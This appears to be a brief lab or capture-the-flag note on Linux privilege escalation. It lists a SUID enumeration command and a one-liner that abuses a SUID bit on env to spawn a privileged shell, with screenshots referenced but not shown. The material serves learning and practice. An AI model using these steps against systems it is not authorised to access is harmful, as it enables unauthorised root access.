- Basic manual enumeration found SUID bit on `env`:
- `find / -perm -u=s -type f 2>/dev/null`
- ![[Pasted image 20250502162215.png]]
- ![[Pasted image 20250502162203.png]]

# Exploitation
---
- `/usr/bin/env /bin/sh -p`
	- ![[Pasted image 20250502162257.png]]